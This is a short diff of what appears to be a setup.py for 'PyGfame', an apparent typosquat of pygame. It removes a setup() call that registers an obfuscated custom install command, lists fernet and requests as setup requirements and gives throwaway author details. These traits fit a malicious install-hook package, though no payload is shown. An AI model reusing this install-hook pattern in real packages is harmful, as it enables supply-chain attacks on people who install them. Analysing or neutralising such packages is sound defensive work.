@@ -18,22 +18,5 @@ class uYyZUakvBfrEMBxhusxWJtLrcwCwFtHLngShgGdblvTBrkRZosmYGdYordfOZXUmrCxKCU(ins
             install.run(self)
 
 
-setup(
-    name="PyGfame",
-    version=VERSION,
-    author="PpDvDbvJFQpGzj",
-    author_email="YOulXDoEvoNpcjgkW@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': uYyZUakvBfrEMBxhusxWJtLrcwCwFtHLngShgGdblvTBrkRZosmYGdYordfOZXUmrCxKCU,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 
